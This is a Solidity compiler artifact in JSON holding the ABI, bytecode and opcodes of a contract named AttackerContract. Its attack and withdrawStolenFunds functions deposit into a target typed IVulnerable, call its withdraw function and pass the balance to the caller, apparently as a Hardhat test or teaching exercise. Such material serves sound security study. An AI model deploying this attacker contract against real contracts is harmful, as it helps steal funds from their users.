{"contracts/AttackerContract.sol":{"AttackerContract":{"abi":[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"address","name":"_target","type":"address"}],"name":"attack","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"target","outputs":[{"internalType":"contract IVulnerable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdrawStolenFunds","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"linkReferences":{},"object":"6080604052348015600e575f80fd5b506106178061001c5f395ff3fe608060405260043610610037575f3560e01c8063d018db3e14610121578063d4b8399214610134578063fd2767541461016e576100f5565b366100f55761007a60405180604001604052806014815260200173030ba3a30b1b5b2b9103130b630b731b290169f160651b81525061007547610182565b610212565b604080518082019091526014815273031b7b73a3930b1ba103130b630b731b290169f160651b60208201525f546100bf9190610075906001600160a01b031631610182565b6100f3604051806040016040528060138152602001722d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d60681b81525061025b565b005b6100f36040518060400160405280600b81526020016a2a2a2066616c6c6261636b60a81b81525061025b565b6100f361012f3660046104e1565b6102a1565b34801561013f575f80fd5b505f54610152906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b348015610179575f80fd5b506100f36103bd565b60605f61018e836103e6565b60010190505f8167ffffffffffffffff8111156101ad576101ad61050e565b6040519080825280601f01601f1916602001820160405280156101d7576020820181803683370190505b5090508181016020015b5f19016f181899199a1a9b1b9c1cb0b131b232b360811b600a86061a8153600a85049450846101e157509392505050565b6102578282604051602401610228929190610550565b60408051601f198184030181529190526020810180516001600160e01b0316634b5c427760e01b1790526104be565b5050565b61029e8160405160240161026f919061057d565b60408051601f198184030181529190526020810180516001600160e01b031663104c13eb60e21b1790526104be565b50565b670de0b6b3a76400003410156102f35760405162461bcd60e51b815260206004820152601360248201527209ccacac840c2e840d8cac2e6e84062408aa89606b1b604482015260640160405180910390fd5b5f80546001600160a01b0319166001600160a01b0383169081178255604051636c2a257560e11b8152909163d8544aea913491610336916002919060040161058f565b5f604051808303818588803b15801561034d575f80fd5b505af115801561035f573d5f803e3d5ffd5b50505f805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b1580156103a4575f80fd5b505af11580156103b6573d5f803e3d5ffd5b5050505050565b60405133904780156108fc02915f818181858888f1935050505015801561029e573d5f803e3d5ffd5b5f8072184f03e93ff9f4daa797ed6e38ed64bf6a1f0160401b83106104245772184f03e93ff9f4daa797ed6e38ed64bf6a1f0160401b830492506040015b6d04ee2d6d415b85acef81000000008310610450576d04ee2d6d415b85acef8100000000830492506020015b662386f26fc10000831061046e57662386f26fc10000830492506010015b6305f5e1008310610486576305f5e100830492506008015b612710831061049a57612710830492506004015b606483106104ac576064830492506002015b600a83106104b8576001015b92915050565b61029e815f6a636f6e736f6c652e6c6f6790505f80835160208501845afa505050565b5f602082840312156104f1575f80fd5b81356001600160a01b0381168114610507575f80fd5b9392505050565b634e487b7160e01b5f52604160045260245ffd5b5f81518084528060208401602086015e5f602082860101526020601f19601f83011685010191505092915050565b604081525f6105626040830185610522565b82810360208401526105748185610522565b95945050505050565b602081525f6105076020830184610522565b60608082526008908201526730ba3a30b1b5b2b960c11b608082015260ff8316602082015260a08101600383106105d457634e487b7160e01b5f52602160045260245ffd5b826040830152939250505056fea2646970667358221220f878216da63a461f66d370cf844ff4408fcf79708fe67d8fbf653ebaf3aa1a1b64736f6c634300081a0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x617 DUP1 PUSH2 0x1C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xD018DB3E EQ PUSH2 0x121 JUMPI DUP1 PUSH4 0xD4B83992 EQ PUSH2 0x134 JUMPI DUP1 PUSH4 0xFD276754 EQ PUSH2 0x16E JUMPI PUSH2 0xF5 JUMP JUMPDEST CALLDATASIZE PUSH2 0xF5 JUMPI PUSH2 0x7A PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x14 DUP2 MSTORE PUSH1 0x20 ADD PUSH20 0x30BA3A30B1B5B2B9103130B630B731B290169F1 PUSH1 0x65 SHL DUP2 MSTORE POP PUSH2 0x75 SELFBALANCE PUSH2 0x182 JUMP JUMPDEST PUSH2 0x212 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x14 DUP2 MSTORE PUSH20 0x31B7B73A3930B1BA103130B630B731B290169F1 PUSH1 0x65 SHL PUSH1 0x20 DUP3 ADD MSTORE PUSH0 SLOAD PUSH2 0xBF SWAP2 SWAP1 PUSH2 0x75 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE PUSH2 0x182 JUMP JUMPDEST PUSH2 0xF3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x13 DUP2 MSTORE PUSH1 0x20 ADD PUSH19 0x2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D PUSH1 0x68 SHL DUP2 MSTORE POP PUSH2 0x25B JUMP JUMPDEST STOP JUMPDEST PUSH2 0xF3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0xB DUP2 MSTORE PUSH1 0x20 ADD PUSH11 0x2A2A2066616C6C6261636B PUSH1 0xA8 SHL DUP2 MSTORE POP PUSH2 0x25B JUMP JUMPDEST PUSH2 0xF3 PUSH2 0x12F CALLDATASIZE PUSH1 0x4 PUSH2 0x4E1 JUMP JUMPDEST PUSH2 0x2A1 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x13F JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH0 SLOAD PUSH2 0x152 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x179 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xF3 PUSH2 0x3BD JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x18E DUP4 PUSH2 0x3E6 JUMP JUMPDEST PUSH1 0x1 ADD SWAP1 POP PUSH0 DUP2 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x1AD JUMPI PUSH2 0x1AD PUSH2 0x50E JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x1D7 JUMPI PUSH1 0x20 DUP3 ADD DUP2 DUP1 CALLDATASIZE DUP4 CALLDATACOPY ADD SWAP1 POP JUMPDEST POP SWAP1 POP DUP2 DUP2 ADD PUSH1 0x20 ADD JUMPDEST PUSH0 NOT ADD PUSH16 0x181899199A1A9B1B9C1CB0B131B232B3 PUSH1 0x81 SHL PUSH1 0xA DUP7 MOD BYTE DUP2 MSTORE8 PUSH1 0xA DUP6 DIV SWAP5 POP DUP5 PUSH2 0x1E1 JUMPI POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH2 0x257 DUP3 DUP3 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x228 SWAP3 SWAP2 SWAP1 PUSH2 0x550 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1F NOT DUP2 DUP5 SUB ADD DUP2 MSTORE SWAP2 SWAP1 MSTORE PUSH1 0x20 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0x4B5C4277 PUSH1 0xE0 SHL OR SWAP1 MSTORE PUSH2 0x4BE JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH2 0x29E DUP2 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x26F SWAP2 SWAP1 PUSH2 0x57D JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1F NOT DUP2 DUP5 SUB ADD DUP2 MSTORE SWAP2 SWAP1 MSTORE PUSH1 0x20 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0x104C13EB PUSH1 0xE2 SHL OR SWAP1 MSTORE PUSH2 0x4BE JUMP JUMPDEST POP JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x2F3 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x13 PUSH1 0x24 DUP3 ADD MSTORE PUSH19 0x9CCACAC840C2E840D8CAC2E6E84062408AA89 PUSH1 0x6B SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND SWAP1 DUP2 OR DUP3 SSTORE PUSH1 0x40 MLOAD PUSH4 0x6C2A2575 PUSH1 0xE1 SHL DUP2 MSTORE SWAP1 SWAP2 PUSH4 0xD8544AEA SWAP2 CALLVALUE SWAP2 PUSH2 0x336 SWAP2 PUSH1 0x2 SWAP2 SWAP1 PUSH1 0x4 ADD PUSH2 0x58F JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x34D JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x35F JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP PUSH0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x3CCFD60B PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP6 POP PUSH4 0x3CCFD60B SWAP5 POP PUSH1 0x4 DUP1 DUP3 ADD SWAP5 POP SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3A4 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3B6 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD CALLER SWAP1 SELFBALANCE DUP1 ISZERO PUSH2 0x8FC MUL SWAP2 PUSH0 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x29E JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST PUSH0 DUP1 PUSH19 0x184F03E93FF9F4DAA797ED6E38ED64BF6A1F01 PUSH1 0x40 SHL DUP4 LT PUSH2 0x424 JUMPI PUSH19 0x184F03E93FF9F4DAA797ED6E38ED64BF6A1F01 PUSH1 0x40 SHL DUP4 DIV SWAP3 POP PUSH1 0x40 ADD JUMPDEST PUSH14 0x4EE2D6D415B85ACEF8100000000 DUP4 LT PUSH2 0x450 JUMPI PUSH14 0x4EE2D6D415B85ACEF8100000000 DUP4 DIV SWAP3 POP PUSH1 0x20 ADD JUMPDEST PUSH7 0x2386F26FC10000 DUP4 LT PUSH2 0x46E JUMPI PUSH7 0x2386F26FC10000 DUP4 DIV SWAP3 POP PUSH1 0x10 ADD JUMPDEST PUSH4 0x5F5E100 DUP4 LT PUSH2 0x486 JUMPI PUSH4 0x5F5E100 DUP4 DIV SWAP3 POP PUSH1 0x8 ADD JUMPDEST PUSH2 0x2710 DUP4 LT PUSH2 0x49A JUMPI PUSH2 0x2710 DUP4 DIV SWAP3 POP PUSH1 0x4 ADD JUMPDEST PUSH1 0x64 DUP4 LT PUSH2 0x4AC JUMPI PUSH1 0x64 DUP4 DIV SWAP3 POP PUSH1 0x2 ADD JUMPDEST PUSH1 0xA DUP4 LT PUSH2 0x4B8 JUMPI PUSH1 0x1 ADD JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x29E DUP2 PUSH0 PUSH11 0x636F6E736F6C652E6C6F67 SWAP1 POP PUSH0 DUP1 DUP4 MLOAD PUSH1 0x20 DUP6 ADD DUP5 GAS STATICCALL POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x4F1 JUMPI PUSH0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x507 JUMPI PUSH0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 MLOAD DUP1 DUP5 MSTORE DUP1 PUSH1 0x20 DUP5 ADD PUSH1 0x20 DUP7 ADD MCOPY PUSH0 PUSH1 0x20 DUP3 DUP7 ADD ADD MSTORE PUSH1 0x20 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND DUP6 ADD ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x40 DUP2 MSTORE PUSH0 PUSH2 0x562 PUSH1 0x40 DUP4 ADD DUP6 PUSH2 0x522 JUMP JUMPDEST DUP3 DUP2 SUB PUSH1 0x20 DUP5 ADD MSTORE PUSH2 0x574 DUP2 DUP6 PUSH2 0x522 JUMP JUMPDEST SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x20 DUP2 MSTORE PUSH0 PUSH2 0x507 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x522 JUMP JUMPDEST PUSH1 0x60 DUP1 DUP3 MSTORE PUSH1 0x8 SWAP1 DUP3 ADD MSTORE PUSH8 0x30BA3A30B1B5B2B9 PUSH1 0xC1 SHL PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0xFF DUP4 AND PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0xA0 DUP2 ADD PUSH1 0x3 DUP4 LT PUSH2 0x5D4 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x21 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST DUP3 PUSH1 0x40 DUP4 ADD MSTORE SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xF8 PUSH25 0x216DA63A461F66D370CF844FF4408FCF79708FE67D8FBF653E 0xBA RETURN 0xAA BYTE SHL PUSH5 0x736F6C6343 STOP ADDMOD BYTE STOP CALLER "},"gasEstimates":{"creation":{"codeDepositCost":"311800","executionCost":"347","totalCost":"312147"},"external":{"":"infinite","attack(address)":"infinite","target()":"2323","withdrawStolenFunds()":"infinite"}},"methodIdentifiers":{"attack(address)":"d018db3e","target()":"d4b83992","withdrawStolenFunds()":"fd276754"}},"storageLayout":{"storage":[{"astId":1438,"contract":"contracts/AttackerContract.sol:AttackerContract","label":"target","offset":0,"slot":"0","type":"t_contract(IVulnerable)1435"}],"types":{"t_contract(IVulnerable)1435":{"encoding":"inplace","label":"contract IVulnerable","numberOfBytes":"20"}}},"userdoc":{"kind":"user","methods":{},"version":1}}}}